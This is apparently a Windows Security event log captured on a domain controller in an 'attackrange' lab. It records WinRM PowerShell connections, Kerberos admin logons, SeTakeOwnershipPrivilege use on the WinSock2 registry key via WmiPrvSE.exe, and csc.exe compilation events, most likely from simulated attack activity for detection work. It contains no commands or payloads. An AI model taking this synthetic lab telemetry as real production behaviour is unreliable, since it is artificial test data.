	Source Address:		fe80::6167:9038:1edc:47d4
	Source Port:		0
	Destination Address:	fe80::6167:9038:1edc:47d4
	Destination Port:		128
	Protocol:		58

Filter Information:
	Filter Run-Time ID:	65786
	Layer Name:		Receive/Accept
	Layer Run-Time ID:	46
03/01/2021 10:55:42 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382532
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		4
	Application Name:	System

Network Information:
	Direction:		Outbound
	Source Address:		fe80::6167:9038:1edc:47d4
	Source Port:		128
	Destination Address:	fe80::6167:9038:1edc:47d4
	Destination Port:		0
	Protocol:		58

Filter Information:
	Filter Run-Time ID:	65788
	Layer Name:		Connect
	Layer Run-Time ID:	50
03/01/2021 10:55:42 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4674
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Sensitive Privilege Use
OpCode=Info
RecordNumber=1382531
Keywords=Audit Success
Message=An operation was attempted on a privileged object.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Object:
	Object Server:	Security
	Object Type:	-
	Object Name:	-
	Object Handle:	0x298

Process Information:
	Process ID:	0x1ad4
	Process Name:	C:\Windows\System32\wbem\WmiPrvSE.exe

Requested Operation:
	Desired Access:	983103
	Privileges:		SeTakeOwnershipPrivilege
03/01/2021 10:55:42 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4674
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Sensitive Privilege Use
OpCode=Info
RecordNumber=1382530
Keywords=Audit Success
Message=An operation was attempted on a privileged object.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Object:
	Object Server:	Security
	Object Type:	Key
	Object Name:	\REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\WinSock2\Parameters
	Object Handle:	0x298

Process Information:
	Process ID:	0x1ad4
	Process Name:	C:\Windows\System32\wbem\WmiPrvSE.exe

Requested Operation:
	Desired Access:	DELETE
				READ_CONTROL
				WRITE_DAC
				WRITE_OWNER
				Query key value
				Set key value
				Create sub-key
				Enumerate sub-keys
				Notify about changes to keys
				Create Link
				
	Privileges:		SeTakeOwnershipPrivilege
03/01/2021 10:55:42 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4674
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Sensitive Privilege Use
OpCode=Info
RecordNumber=1382529
Keywords=Audit Success
Message=An operation was attempted on a privileged object.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Object:
	Object Server:	Security
	Object Type:	-
	Object Name:	-
	Object Handle:	0x274

Process Information:
	Process ID:	0x1ad4
	Process Name:	C:\Windows\System32\wbem\WmiPrvSE.exe

Requested Operation:
	Desired Access:	983103
	Privileges:		SeTakeOwnershipPrivilege
03/01/2021 10:55:42 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4674
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Sensitive Privilege Use
OpCode=Info
RecordNumber=1382528
Keywords=Audit Success
Message=An operation was attempted on a privileged object.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Object:
	Object Server:	Security
	Object Type:	Key
	Object Name:	\REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\WinSock2\Parameters
	Object Handle:	0x274

Process Information:
	Process ID:	0x1ad4
	Process Name:	C:\Windows\System32\wbem\WmiPrvSE.exe

Requested Operation:
	Desired Access:	DELETE
				READ_CONTROL
				WRITE_DAC
				WRITE_OWNER
				Query key value
				Set key value
				Create sub-key
				Enumerate sub-keys
				Notify about changes to keys
				Create Link
				
	Privileges:		SeTakeOwnershipPrivilege
03/01/2021 10:55:42 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4624
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Logon
OpCode=Info
RecordNumber=1382527
Keywords=Audit Success
Message=An account was successfully logged on.

Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Logon Information:
	Logon Type:		3
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Delegation

New Logon:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		Administrator
	Account Domain:		ATTACKRANGE.LOCAL
	Logon ID:		0x500392A
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{6D9750ED-EBB5-B481-5E82-E1B9C9B4B32E}

Process Information:
	Process ID:		0x0
	Process Name:		-

Network Information:
	Workstation Name:	-
	Source Network Address:	-
	Source Port:		-

Detailed Authentication Information:
	Logon Process:		Kerberos
	Authentication Package:	Kerberos
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.
03/01/2021 10:55:42 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4672
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Special Logon
OpCode=Info
RecordNumber=1382526
Keywords=Audit Success
Message=Special privileges assigned to new logon.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		Administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x500392A

Privileges:		SeSecurityPrivilege
			SeBackupPrivilege
			SeRestorePrivilege
			SeTakeOwnershipPrivilege
			SeDebugPrivilege
			SeSystemEnvironmentPrivilege
			SeLoadDriverPrivilege
			SeImpersonatePrivilege
			SeDelegateSessionUserImpersonatePrivilege
			SeEnableDelegationPrivilege
03/01/2021 10:55:42 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382525
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		4
	Application Name:	System

Network Information:
	Direction:		Inbound
	Source Address:		fe80::6167:9038:1edc:47d4
	Source Port:		55164
	Destination Address:	fe80::6167:9038:1edc:47d4
	Destination Port:		5985
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	65786
	Layer Name:		Receive/Accept
	Layer Run-Time ID:	46
03/01/2021 10:55:42 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382524
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		5596
	Application Name:	\device\harddiskvolume1\windows\system32\windowspowershell\v1.0\powershell.exe

Network Information:
	Direction:		Outbound
	Source Address:		fe80::6167:9038:1edc:47d4
	Source Port:		55164
	Destination Address:	fe80::6167:9038:1edc:47d4
	Destination Port:		5985
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	65788
	Layer Name:		Connect
	Layer Run-Time ID:	50
03/01/2021 10:55:42 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382523
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		5596
	Application Name:	\device\harddiskvolume1\windows\system32\windowspowershell\v1.0\powershell.exe

Network Information:
	Source Address:		::
	Source Port:		55164
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	38
03/01/2021 10:55:43 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382537
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		4
	Application Name:	System

Network Information:
	Direction:		Inbound
	Source Address:		fe80::6167:9038:1edc:47d4
	Source Port:		0
	Destination Address:	fe80::6167:9038:1edc:47d4
	Destination Port:		128
	Protocol:		58

Filter Information:
	Filter Run-Time ID:	65786
	Layer Name:		Receive/Accept
	Layer Run-Time ID:	46
03/01/2021 10:55:43 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382536
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		4
	Application Name:	System

Network Information:
	Direction:		Outbound
	Source Address:		fe80::6167:9038:1edc:47d4
	Source Port:		128
	Destination Address:	fe80::6167:9038:1edc:47d4
	Destination Port:		0
	Protocol:		58

Filter Information:
	Filter Run-Time ID:	65788
	Layer Name:		Connect
	Layer Run-Time ID:	50
03/01/2021 10:55:43 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4674
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Sensitive Privilege Use
OpCode=Info
RecordNumber=1382535
Keywords=Audit Success
Message=An operation was attempted on a privileged object.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Object:
	Object Server:	Security
	Object Type:	-
	Object Name:	-
	Object Handle:	0x2a0

Process Information:
	Process ID:	0x1ad4
	Process Name:	C:\Windows\System32\wbem\WmiPrvSE.exe

Requested Operation:
	Desired Access:	983103
	Privileges:		SeTakeOwnershipPrivilege
03/01/2021 10:55:43 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4674
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Sensitive Privilege Use
OpCode=Info
RecordNumber=1382534
Keywords=Audit Success
Message=An operation was attempted on a privileged object.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Object:
	Object Server:	Security
	Object Type:	Key
	Object Name:	\REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\WinSock2\Parameters
	Object Handle:	0x2a0

Process Information:
	Process ID:	0x1ad4
	Process Name:	C:\Windows\System32\wbem\WmiPrvSE.exe

Requested Operation:
	Desired Access:	DELETE
				READ_CONTROL
				WRITE_DAC
				WRITE_OWNER
				Query key value
				Set key value
				Create sub-key
				Enumerate sub-keys
				Notify about changes to keys
				Create Link
				
	Privileges:		SeTakeOwnershipPrivilege
03/01/2021 10:55:44 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382542
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		4
	Application Name:	System

Network Information:
	Direction:		Inbound
	Source Address:		fe80::6167:9038:1edc:47d4
	Source Port:		0
	Destination Address:	fe80::6167:9038:1edc:47d4
	Destination Port:		128
	Protocol:		58

Filter Information:
	Filter Run-Time ID:	65786
	Layer Name:		Receive/Accept
	Layer Run-Time ID:	46
03/01/2021 10:55:44 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382541
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		4
	Application Name:	System

Network Information:
	Direction:		Outbound
	Source Address:		fe80::6167:9038:1edc:47d4
	Source Port:		128
	Destination Address:	fe80::6167:9038:1edc:47d4
	Destination Port:		0
	Protocol:		58

Filter Information:
	Filter Run-Time ID:	65788
	Layer Name:		Connect
	Layer Run-Time ID:	50
03/01/2021 10:55:44 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4674
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Sensitive Privilege Use
OpCode=Info
RecordNumber=1382540
Keywords=Audit Success
Message=An operation was attempted on a privileged object.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Object:
	Object Server:	Security
	Object Type:	-
	Object Name:	-
	Object Handle:	0x2b4

Process Information:
	Process ID:	0x1ad4
	Process Name:	C:\Windows\System32\wbem\WmiPrvSE.exe

Requested Operation:
	Desired Access:	983103
	Privileges:		SeTakeOwnershipPrivilege
03/01/2021 10:55:44 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4674
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Sensitive Privilege Use
OpCode=Info
RecordNumber=1382539
Keywords=Audit Success
Message=An operation was attempted on a privileged object.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Object:
	Object Server:	Security
	Object Type:	Key
	Object Name:	\REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\WinSock2\Parameters
	Object Handle:	0x2b4

Process Information:
	Process ID:	0x1ad4
	Process Name:	C:\Windows\System32\wbem\WmiPrvSE.exe

Requested Operation:
	Desired Access:	DELETE
				READ_CONTROL
				WRITE_DAC
				WRITE_OWNER
				Query key value
				Set key value
				Create sub-key
				Enumerate sub-keys
				Notify about changes to keys
				Create Link
				
	Privileges:		SeTakeOwnershipPrivilege
03/01/2021 10:55:44 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382538
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		61064
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:55:45 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4634
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Logoff
OpCode=Info
RecordNumber=1382559
Keywords=Audit Success
Message=An account was logged off.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		Administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x500392A

Logon Type:			3

This event is generated when a logon session is destroyed. It may be positively correlated with a logon event using the Logon ID value. Logon IDs are only unique between reboots on the same computer.
03/01/2021 10:55:45 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4634
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Logoff
OpCode=Info
RecordNumber=1382558
Keywords=Audit Success
Message=An account was logged off.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		Administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x5002DCF

Logon Type:			3

This event is generated when a logon session is destroyed. It may be positively correlated with a logon event using the Logon ID value. Logon IDs are only unique between reboots on the same computer.
03/01/2021 10:55:45 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4634
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Logoff
OpCode=Info
RecordNumber=1382557
Keywords=Audit Success
Message=An account was logged off.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		Administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x5005823

Logon Type:			3

This event is generated when a logon session is destroyed. It may be positively correlated with a logon event using the Logon ID value. Logon IDs are only unique between reboots on the same computer.
03/01/2021 10:55:45 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382556
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		Administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x5001929

Process Information:
	Process ID:	0x2138
	Process Name:	C:\Windows\System32\wsmprovhost.exe
	Exit Status:	0x0
03/01/2021 10:55:45 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382555
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Process Information:
	Process ID:	0x15dc
	Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Exit Status:	0x0
03/01/2021 10:55:45 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4624
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Logon
OpCode=Info
RecordNumber=1382554
Keywords=Audit Success
Message=An account was successfully logged on.

Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Logon Information:
	Logon Type:		3
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Delegation

New Logon:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		Administrator
	Account Domain:		ATTACKRANGE.LOCAL
	Logon ID:		0x5005823
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{6D9750ED-EBB5-B481-5E82-E1B9C9B4B32E}

Process Information:
	Process ID:		0x0
	Process Name:		-

Network Information:
	Workstation Name:	-
	Source Network Address:	-
	Source Port:		-

Detailed Authentication Information:
	Logon Process:		Kerberos
	Authentication Package:	Kerberos
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.
03/01/2021 10:55:45 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4672
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Special Logon
OpCode=Info
RecordNumber=1382553
Keywords=Audit Success
Message=Special privileges assigned to new logon.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		Administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x5005823

Privileges:		SeSecurityPrivilege
			SeBackupPrivilege
			SeRestorePrivilege
			SeTakeOwnershipPrivilege
			SeDebugPrivilege
			SeSystemEnvironmentPrivilege
			SeLoadDriverPrivilege
			SeImpersonatePrivilege
			SeDelegateSessionUserImpersonatePrivilege
			SeEnableDelegationPrivilege
03/01/2021 10:55:45 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4648
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Logon
OpCode=Info
RecordNumber=1382552
Keywords=Audit Success
Message=A logon was attempted using explicit credentials.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1
	Logon GUID:		{36BA520A-0022-0F72-A18C-6529BD1456FC}

Account Whose Credentials Were Used:
	Account Name:		administrator
	Account Domain:		ATTACKRANGE.LOCAL
	Logon GUID:		{00000000-0000-0000-0000-000000000000}

Target Server:
	Target Server Name:	win-dc-974.attackrange.local
	Additional Information:	HTTP/win-dc-974.attackrange.local

Process Information:
	Process ID:		0x15dc
	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

Network Information:
	Network Address:	-
	Port:			-

This event is generated when a process attempts to log on an account by explicitly specifying that account’s credentials.  This most commonly occurs in batch-type configurations such as scheduled tasks, or when using the RUNAS command.
03/01/2021 10:55:45 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382551
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		4
	Application Name:	System

Network Information:
	Direction:		Inbound
	Source Address:		fe80::6167:9038:1edc:47d4
	Source Port:		0
	Destination Address:	fe80::6167:9038:1edc:47d4
	Destination Port:		128
	Protocol:		58

Filter Information:
	Filter Run-Time ID:	65786
	Layer Name:		Receive/Accept
	Layer Run-Time ID:	46
03/01/2021 10:55:45 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382550
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		4
	Application Name:	System

Network Information:
	Direction:		Outbound
	Source Address:		fe80::6167:9038:1edc:47d4
	Source Port:		128
	Destination Address:	fe80::6167:9038:1edc:47d4
	Destination Port:		0
	Protocol:		58

Filter Information:
	Filter Run-Time ID:	65788
	Layer Name:		Connect
	Layer Run-Time ID:	50
03/01/2021 10:55:45 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4674
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Sensitive Privilege Use
OpCode=Info
RecordNumber=1382549
Keywords=Audit Success
Message=An operation was attempted on a privileged object.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Object:
	Object Server:	Security
	Object Type:	-
	Object Name:	-
	Object Handle:	0x2b0

Process Information:
	Process ID:	0x1ad4
	Process Name:	C:\Windows\System32\wbem\WmiPrvSE.exe

Requested Operation:
	Desired Access:	983103
	Privileges:		SeTakeOwnershipPrivilege
03/01/2021 10:55:45 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4674
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Sensitive Privilege Use
OpCode=Info
RecordNumber=1382548
Keywords=Audit Success
Message=An operation was attempted on a privileged object.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Object:
	Object Server:	Security
	Object Type:	Key
	Object Name:	\REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\WinSock2\Parameters
	Object Handle:	0x2b0

Process Information:
	Process ID:	0x1ad4
	Process Name:	C:\Windows\System32\wbem\WmiPrvSE.exe

Requested Operation:
	Desired Access:	DELETE
				READ_CONTROL
				WRITE_DAC
				WRITE_OWNER
				Query key value
				Set key value
				Create sub-key
				Enumerate sub-keys
				Notify about changes to keys
				Create Link
				
	Privileges:		SeTakeOwnershipPrivilege
03/01/2021 10:55:45 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382547
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		59336
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:55:45 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382546
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Inbound
	Source Address:		::1
	Source Port:		51662
	Destination Address:	::1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65786
	Layer Name:		Receive/Accept
	Layer Run-Time ID:	46
03/01/2021 10:55:45 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382545
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		::1
	Source Port:		51662
	Destination Address:	::1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65788
	Layer Name:		Connect
	Layer Run-Time ID:	50
03/01/2021 10:55:45 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382544
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		51662
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	38
03/01/2021 10:55:45 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382543
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		51662
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:55:46 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382569
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Process Information:
	Process ID:	0x2044
	Process Name:	C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
	Exit Status:	0x0
03/01/2021 10:55:46 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382568
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Process Information:
	Process ID:	0x2134
	Process Name:	C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe
	Exit Status:	0x0
03/01/2021 10:55:46 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382567
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x2134
	New Process Name:	C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x2044
	Creator Process Name:	C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
